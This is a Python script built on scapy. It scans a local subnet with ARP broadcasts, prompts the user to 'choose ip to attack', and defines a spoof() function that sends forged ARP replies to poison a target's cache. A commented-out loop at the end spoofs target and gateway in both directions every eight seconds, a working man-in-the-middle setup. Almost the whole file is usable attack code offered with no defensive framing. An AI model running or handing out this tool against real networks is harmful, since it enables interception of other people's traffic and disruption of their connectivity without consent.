from scapy.all import *
import requests
import socket
from sys import argv
from colorama import Fore
import time

#s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#s.connect(("8.8.8.8", 80))
#the_ip = s.getsockname()[0]+'/24'


def Scan_arp(IP, time, Scans, network_ip):

    exitx = []

    for XYZ in range(Scans):

        arp_req = ARP(pdst=IP)  #
        brod = Ether(dst='ff:ff:ff:ff:ff:ff')
        arp_brod = brod / arp_req
        result = srp(arp_brod, timeout=int(time), verbose=False)[0]
        lst = []
        for element in result:
            cli = {'ip': element[1].psrc, 'mac': element[1].hwsrc}
            lst.append(cli)

        for i in lst:
            if i['ip'] not in exitx:

                exitx.append(i['ip'])
    print('\n')
    for Hello, IPS in enumerate(exitx):
        Hello += 1
        print(f'{Fore.RED}{Hello}', f'-{Fore.WHITE} ', IPS)

    Test = exitx[int(input(
        f'\n{Fore.CYAN}[{Fore.GREEN}?{Fore.CYAN}]{Fore.WHITE} Choose ip to attack  : '))-1]
    return Test


def get_mac(ip):
    try:

        # make arp packet and seve it in ( arp_packet )
        arp_packet = ARP(pdst=ip)
        # broadcast packet
        bro_packet = Ether(dst='ff:ff:ff:ff:ff:ff')
        # make broadcast packet
        arp_bro_packet = bro_packet/arp_packet
        # save mac for target in ( answr_list )
        answr_list = srp(arp_bro_packet, timeout=1, verbose=False)[0]
        # return mac
        return answr_list[0][1].hwsrc
    except:
        pass


def spoof(target_ip, spoof_ip):
    # send IP target in ( get_mac ) to get mac address IP
    target_mac = get_mac(target_ip)
    #       make ARP | op = replay | pdst = IP target | hwdst = mac target | psrc = send to IP
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # send the packet
    send(packet, verbose=False)


'''
try:
    while True:

        # target to spoof
        spoof(target, spoofs)
        # spoof to target
        spoof(spoofs, target)
        print(
            f'{Fore.CYAN}[{Fore.GREEN}+{Fore.CYAN}]{Fore.WHITE} Done send Packet ...')
        time.sleep(8)

except:
    pass


# s.close()
'''